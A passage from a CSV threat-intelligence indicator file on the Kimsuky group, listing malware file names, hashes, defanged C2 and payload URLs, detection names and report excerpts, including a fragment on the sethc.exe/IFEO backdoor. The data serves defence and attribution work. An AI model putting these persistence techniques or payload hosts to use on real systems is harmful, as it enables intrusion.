f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:59e7e68d91e1ec4c86d5e3bef9bffb8e6af6c709205221fae6a6bbfc5186d5c9,observation--sha256:50718fb523dd73bd2d2626b585987986beadb3170574ce1950d5e3e4b88d183c,file-name,defaultes_x86.dll,defaultes_x86.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:59e7e68d91e1ec4c86d5e3bef9bffb8e6af6c709205221fae6a6bbfc5186d5c9,observation--sha256:a55c35be1439971fb58b8fa668f10247b754a0e337051c5a7a6eaac3a5f29864,file-name,defaultes_x86.dll,defaultes_x86.dll,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6ec05e1c570cd83a3cacbd7189b3b7d3c224ce1bf5bf2461570c196c2eb85ec2,observation--sha256:85681b204d6eeab24809c3de3e5b006a2f83d5700b6671340cf57537343ae81a,file-name,defaults_x86.dll,defaults_x86.dll,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:63d9f8b98a2d10effc7488b6ca9b9740ff747132e07a75c5aa6cd5cf6e8a9ede,observation--sha256:96d59719ab4bed74fc7a1f28dbae800571e47166b52c9d8a071fea4ec7c30bc6,file-name,defender.ps1,defender.ps1,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1d2b96bcad642645f56dcba5eedd9c5f5c032314263accb8a7f1d9b635746744,observation--sha256:927b940c4ac6bd12a1c39451338df0e7fadceb5c217b82c0361703e4aa2849d7,file-name,details.docx,details.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c95097a95f072157238500e83065d5eb0bd9f49d6c89eb4269f51d99aa7321f6,observation--sha256:bd6d10f70e2e1796cef7f2646b40f3875b37fbe575dd47b7c8a2b55059011f9a,file-name,dns_x64.dll,dns_x64.dll,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c95097a95f072157238500e83065d5eb0bd9f49d6c89eb4269f51d99aa7321f6,observation--sha256:d77eddf42eeb80921b42a8e91a9e9f92d7fca9f533047c0df926dbca2243e363,file-name,dns_x64.dll,dns_x64.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c95097a95f072157238500e83065d5eb0bd9f49d6c89eb4269f51d99aa7321f6,observation--sha256:50c9f05d0519999a464bbfe3b4cba82319cfb613d697663abeb37d80e86fe1d6,file-name,dns_x64.dll,dns_x64.dll,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e7b39f6e13f54ebaeb489123b50bcb5d77c5287a3d7266d43a20e9ac855bd59,observation--sha256:f8c4464efb344639e149808ac794acc6473bf43491125d8471ba74347326431b,file-name,dns_x86.dll,dns_x86.dll,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e7b39f6e13f54ebaeb489123b50bcb5d77c5287a3d7266d43a20e9ac855bd59,observation--sha256:06ce6bc68c56d33485d0c2249520d98cab2ac6eae201840d39353e30ebdf08b6,file-name,dns_x86.dll,dns_x86.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a3dadebcee6fa5963dffb034354289ee7ff05396ab2601d032287105c64ea172,observation--sha256:90481824857b4aaee31c0db46d5fa3c9422629628950d923a9f4fc88f6b841f4,file-name,dnsadmin_x64_2003.exe,dnsadmin_x64_2003.exe,candidate,2018-07-15T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 12, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,"a7a987fb55f4c1921ea7f6c8f2acd3817bacbee2fdf30c0e4f50ee23656e0b51 malicious MAL_PE_Type_BabyShark_Loader 31 Microsoft: Trojan:Win32/Stolpen.B / Kaspersky: Trojan.Win64.Agent.lio / McAfee: Trojan-StolenPen / CrowdStrike: malicious_confidence_100% (W) / TrendMicro: TROJ_AZDEN.C / Symantec: Trojan.Gen.2 / F-Secure: Trojan.GenericKD.31401329 / Sophos: Mal/Generic-S / GData: Trojan.GenericKD.31401329 dnsadmin_x64_2003.exe 2018-07-15 04:24:49 UTC ( 7 months, 2 weeks ago ) 2018-12-22 21:52:27 Win32 EXE ",
1.0.0,actor--kimsuky,artifact--sha256:a3dadebcee6fa5963dffb034354289ee7ff05396ab2601d032287105c64ea172,observation--sha256:f489bf641cee734d68db6a0953aae371ca79bf21993c4a395cdf4f9e4c4a72f5,file-name,dnsadmin_x64_2003.exe,dnsadmin_x64_2003.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a3dadebcee6fa5963dffb034354289ee7ff05396ab2601d032287105c64ea172,observation--sha256:48a541b347fc84c499e733075e98f9ee2415fd708dc9e9f15cf7477b0fa6b37b,file-name,dnsadmin_x64_2003.exe,dnsadmin_x64_2003.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5a626271f7f32d5a1bf79d276c22d0d74b54fa9c567bbf93eed9290ad3aefd6d,observation--sha256:b8bcdf942314441514c83c87472f2e0072954072ecacff13675e9ff46246f84e,file-name,dnsadmin_x86_2003.exe,dnsadmin_x86_2003.exe,candidate,2018-07-15T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 6, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,7af8699fac52affaaa6e154e1bb74c01afbd100b14ad43974273813f07b63081 malicious MAL_PE_Type_BabyShark_Loader 45 Microsoft: Trojan:Win32/Stolpen.B / Kaspersky: HEUR:Trojan.Win32.Generic / McAfee: RDN/Generic.RP / CrowdStrike: malicious_confidence_100% (W) / TrendMicro: TROJ_FRS.VSN13G18 / ESET-NOD32: a variant of Generik.LTANGSH / Symantec: Trojan Horse / F-Secure: Trojan.GenericKD.40334033 / Sophos: Mal/Generic-S / GData: Trojan.GenericKD.40334033 dnsadmin_x86_2003.exe 2018-07-15 04:24:51 UTC ( 7 mon,
1.0.0,actor--kimsuky,artifact--sha256:5a626271f7f32d5a1bf79d276c22d0d74b54fa9c567bbf93eed9290ad3aefd6d,observation--sha256:ca603df5997d1d9c10d5852e59ef074efa2cdebf6ef98e1a844a14979fa185c4,file-name,dnsadmin_x86_2003.exe,dnsadmin_x86_2003.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5a626271f7f32d5a1bf79d276c22d0d74b54fa9c567bbf93eed9290ad3aefd6d,observation--sha256:25af91a548b8e7da8b3f7596e99c97319a5d76edfb841b2a1db9fb61d484ea77,file-name,dnsadmin_x86_2003.exe,dnsadmin_x86_2003.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 83}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report The malware shown in light yellow in the above (Table 47) is malware signed with a valid certificate (Subject Name: EGIS Co., Ltd.) from 6 years ago. The Kimsuky organization hacked domestic companies and signed malicious code with stolen certificates. A total of 59 malicious codes were signed with the same certificate around the same time, all of which were from the Kimsuky organization. This means that the stolen certificate was only used by the Kimsuky organiza",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:907d6ea98a71820eca0b6e17b1c3758f5d5e49467797ac56659f6ba4059ed4a0,observation--sha256:325e43a68e8f214ac999350d9220757ec5a98c1f2e16ca18aacb60209d2139ac,file-name,doc.php,doc.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:907d6ea98a71820eca0b6e17b1c3758f5d5e49467797ac56659f6ba4059ed4a0,observation--sha256:ddaec3f2de8c3e484343a93b70d2a62e8c58b9f0baab913419da15584929deb7,file-name,doc.php,doc.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 6}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Some accounts are registered on the Korean messenger Kakao Talk, and they are using the messenger services such as Telegram and Skype as well. ESRC believes that there are 'state-sponsored actors' behind the APT attack based on the analyzed data, and named the APT attack 'Campaign Smoke Screen', concerning that the attackers are fluent in Korean and English and act secretly by abusing the stolen profiles that are using photos of foreigners. ■ Analysis of tactics and threat vector of DOC-based AP",
1.0.0,actor--kimsuky,artifact--sha256:b33f7209ea41133f01c85cd6e0d0e0c6f3051a148d0afefc5d7056b6d9c0e580,observation--sha256:938ce60dfbf2c57a7cad58687f90afef4e93d161e6ae1c8b9d2260dc816e448b,file-name,docxview.bat,docxview.bat,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0333ba4da42e8523b628227c6e3001b34d0fea24742a5dd1f27e1c862caff466,observation--sha256:d3df3a7fd93b439d6c4c107650305daf8686b524221de427cbc92dcb8ea289e2,file-name,domain_x64.dll,domain_x64.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0333ba4da42e8523b628227c6e3001b34d0fea24742a5dd1f27e1c862caff466,observation--sha256:6c9b37fc2d168fbdda9d4bf8bb0dcb46f3a9f7fca1d9f643ae2dc59e8eb42175,file-name,domain_x64.dll,domain_x64.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"domain_x64.dll hxxps://www.bleepingcomputer.com/news/security/microsoft-to-kill-off-vbscript-in-windows-to-block- Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands Diagnostic Time File Name 2023-02-24 Removing VBS will not have a significant impact on hacking organizations. The reason is that even if the hacking organization is not VBS, hxxps://learn.microsoft.com/en-us/windows/whats-new/deprecated-features The malicious code ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0333ba4da42e8523b628227c6e3001b34d0fea24742a5dd1f27e1c862caff466,observation--sha256:dcfa1dd4612d42666ee57e0ac826b9da0f43b023544f799b8ac40ffb833582b3,file-name,domain_x64.dll,domain_x64.dll,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0333ba4da42e8523b628227c6e3001b34d0fea24742a5dd1f27e1c862caff466,observation--sha256:116451bbc86549dad50434cc73bcea2e08aa00407e5461f09e250bfe987d52f2,file-name,domain_x64.dll,domain_x64.dll,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ec124fe0206a495a32247907dffdc8fe1cc717db53471cc8fae38d1e25364902,observation--sha256:1e7a413c04c1b849fcdd2bc59e59b0eac6a6842e842e5357f45fd6e2a504dde5,file-name,domain_x86.dll,domain_x86.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"domain_x64.dll hxxps://www.bleepingcomputer.com/news/security/microsoft-to-kill-off-vbscript-in-windows-to-block- Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands Diagnostic Time File Name 2023-02-24 Removing VBS will not have a significant impact on hacking organizations. The reason is that even if the hacking organization is not VBS, hxxps://learn.microsoft.com/en-us/windows/whats-new/deprecated-features The malicious code ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ec124fe0206a495a32247907dffdc8fe1cc717db53471cc8fae38d1e25364902,observation--sha256:1084209f2e96639b04b3e4ac0b01780c306a709c54a14ed527f9da36312b4a42,file-name,domain_x86.dll,domain_x86.dll,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ec124fe0206a495a32247907dffdc8fe1cc717db53471cc8fae38d1e25364902,observation--sha256:a4b175c33c1e06f4d5ae96724ef46ff368fd569826e3112a8f345dda0f3be2c4,file-name,domain_x86.dll,domain_x86.dll,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f07691c267d1a8959d64c53c03c0fac0399518215d7ba5890aea357178a036e0,observation--sha256:255debf997aa9e1fe5c693cbc5b4ad916fbec6e7bb7af4ec3cf256171ef95822,file-name,dpscan.pdb,dpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values 